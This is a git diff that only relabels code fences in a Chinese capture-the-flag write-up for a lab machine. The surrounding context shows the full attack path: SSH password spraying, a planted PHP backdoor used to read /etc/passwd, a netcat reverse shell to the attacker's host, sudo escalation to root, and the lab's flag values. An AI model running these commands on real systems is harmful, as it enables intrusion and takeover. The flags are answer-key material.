@@ -65,7 +65,7 @@ PORT   STATE SERVICE VERSION
 
 将图片下载下来进行分析
 
-```shell
+```bash
 ┌─[randark@parrot]─[~/tmp]
 └──╼ $stegseek saint.jpg
 StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
@@ -81,7 +81,7 @@ lionsarebigcats
 
 尝试进行密码喷洒攻击
 
-```shell
+```bash
 ┌─[randark@parrot]─[~]
 └──╼ $ hydra -I -v -V -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lionsarebigcats 192.168.56.115 ssh -t 4
 ......
@@ -90,7 +90,7 @@ lionsarebigcats
 
 ## User - daniel
 
-```shell
+```bash
 ┌─[✗]─[randark@parrot]─[~]
 └──╼ $ ssh daniel@192.168.56.115
 daniel@192.168.56.115's password:
@@ -109,14 +109,14 @@ daniel
 
 经过探测，这里是受限 shell 环境，即为 `rbash`
 
-```shell
+```bash
 daniel@soul:~$ echo $0
 -rbash
 ```
 
 ### web 目录可控
 
-```shell
+```bash
 ┌─[randark@parrot]─[/usr/share/webshells/php]
 └──╼ $ python-server 80
 ......
@@ -135,7 +135,7 @@ daniel@soul:~$ mv simple-backdoor.php /var/www/html
 
 文件成功上传，但是并没有被解析
 
-```shell
+```bash
 ┌─[randark@parrot]─[/usr/share/webshells/php]
 └──╼ $ curl 192.168.56.115/simple-backdoor.php?cmd=cat+/etc/passwd
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
@@ -205,7 +205,7 @@ include /etc/nginx/sites-enabled/*
 
 查看有哪些文件
 
-```shell
+```bash
 daniel@soul:~$ ls -lh /etc/nginx/sites-enabled/
 total 0
 lrwxrwxrwx 1 root root 34 Nov 26  2020 default -> /etc/nginx/sites-available/default
@@ -266,7 +266,7 @@ server {
 
 然后尝试访问
 
-```shell
+```bash
 ┌─[randark@parrot]─[/usr/share/webshells/php]
 └──╼ $ curl lonelysoul.hmv/simple-backdoor.php?cmd=whoami
 <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->
@@ -279,7 +279,7 @@ server {
 
 ## User - www-data
 
-```shell
+```bash
 # curl lonelysoul.hmv/simple-backdoor.php?cmd=nc+192.168.56.102+9999+-e+/bin/bash
 ┌─[randark@parrot]─[~]
 └──╼ $ pwncat-cs -lp 9999
@@ -305,7 +305,7 @@ User www-data may run the following commands on soul:
 
 部署恶意载荷
 
-```shell
+```bash
 #!/bin/bash
 
 whoami;
@@ -315,7 +315,7 @@ whoami;
 
 ## User - gabriel
 
-```shell
+```bash
 (remote) www-data@soul:/tmp$ sudo -u gabriel /tmp/whoami
 gabriel
 gabriel@soul:/tmp$ whoami
@@ -324,7 +324,7 @@ gabriel
 
 ### flag - user
 
-```shell
+```bash
 gabriel@soul:~$ cat user.txt
 HMViwazhere
 ```
@@ -341,7 +341,7 @@ User gabriel may run the following commands on soul:
 
 ## User - peter
 
-```shell
+```bash
 gabriel@soul:~$ sudo -u peter /usr/sbin/hping3
 hping3> /bin/bash
 peter@soul:/home/gabriel$ whoami
@@ -379,7 +379,7 @@ Permission denied
 
 ## User - root
 
-```shell
+```bash
 peter@soul:~$ /usr/sbin/agetty -o -p -l /bin/bash -a root tty
 
 Debian GNU/Linux 10 soul tty
@@ -392,7 +392,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 bash-5.0# cat rootflag.txt
 HMVohmygod
 ```
